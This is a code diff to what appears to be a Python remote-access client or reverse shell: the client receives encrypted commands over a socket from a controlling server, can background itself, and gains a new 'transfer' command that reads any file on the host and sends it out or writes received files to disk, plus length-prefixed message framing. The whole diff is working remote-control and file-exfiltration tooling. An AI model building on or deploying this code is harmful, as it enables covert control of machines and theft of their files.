@@ -30,12 +30,16 @@ class Commands:
     @command
     def cd(self, data, *args, **kwargs):
         directory = data[3:].decode('utf-8')
-        os.chdir(directory.strip())
+        try:
+            os.chdir(directory.strip())
+            self.send('', print_output=False)
+        except:
+            self.send('cd: %s: No such file or directory\n' % directory)
 
     @command
     def hello(self, *args, **kwargs):
         """this prints hello"""
-        self.print_output('hello')
+        self.send('hello')
 
     @command
     def background(self, *args, **kwargs):
@@ -47,7 +51,34 @@ class Commands:
         """get details on functions to run"""
         commands = self.get_all_commands()
         help_items = ['{0}: {1}'.format(command, func.__doc__) for command, func in commands.items()]
-        self.print_output('\n'.join(help_items))
+        self.send('\n'.join(help_items))
+
+    @command
+    def transfer(self, data, *args, **kwargs):
+        """transfer a file"""
+        data = data.decode('utf-8')
+        transfer_command = [arg for arg in data.split(' ') if arg]
+
+        if transfer_command[1] == 'get':
+            remote_file = transfer_command[2]
+
+            try:
+                with open(remote_file, 'r') as f:
+                    file_data = f.read()
+                self.send(file_data, print_output=False)
+            except Exception as e:
+                self.send('error retrieving file: ' + str(e) + '\n')
+
+        if transfer_command[1] == 'put':
+            remote_file = transfer_command[3]
+
+            file_data = self.receive()
+            try:
+                with open(remote_file, 'w+') as f:
+                    f.write(file_data.decode('utf-8'))
+                self.send('done')
+            except Exception as e:
+                self.send('error saving file: ' + str(e) + '\n')
 
     def get_all_commands(self):
         return self.command.all
@@ -92,24 +123,37 @@ class Client(Commands):
 
     def send(self, output_str, print_output=True):
         sent_message = str.encode(output_str)
-        ciphertext_message = self.encrypt(sent_message)
-        self.socket.send(struct.pack('>I', len(ciphertext_message)) + ciphertext_message)
+        cipher_text = self.encrypt(sent_message)
+        self.socket.send(struct.pack('>I', len(cipher_text)) + cipher_text)
         if print_output:
             print(output_str)
 
     def receive(self):
-        ciphertext = self.socket.recv(2048)
-        msg = self.decrypt(ciphertext)
-        return msg
+        raw_msg_len = self._recvall(4)
+        if not raw_msg_len:
+            return None
+        msg_len = struct.unpack('>I', raw_msg_len)[0]
+        cipher_text = self._recvall(msg_len)
+        output = self.decrypt(cipher_text)
+        return output
+
+    def _recvall(self, n):
+        data = b''
+        while len(data) < n:
+            packet = self.socket.recv(n - len(data))
+            if not packet:
+                return None
+            data += packet
+        return data
 
     def encrypt(self, message):
         f = Fernet(self.encryption_key)
         token = f.encrypt(message)
         return token
 
-    def decrypt(self, ciphertext):
+    def decrypt(self, cipher_text):
         f = Fernet(self.encryption_key)
-        token = f.decrypt(ciphertext)
+        token = f.decrypt(cipher_text)
         return token
 
     def receive_commands(self):
@@ -120,19 +164,12 @@ class Client(Commands):
 
                 data = self.receive()
 
-                if data == b'':
+                if not data:
                     self.send('')
                     break
 
                 command = self.parse_command(data)
-                if command == 'cd':
-                    directory = data[3:].decode('utf-8')
-                    try:
-                        os.chdir(directory.strip())
-                        self.send('', print_output=False)
-                    except:
-                        self.send('cd: %s: No such file or directory\n' % directory)
-                elif command in self.custom_commands:
+                if command in self.custom_commands:
                     self.run_custom_command(command, data)
                     if command == 'background':
                         break
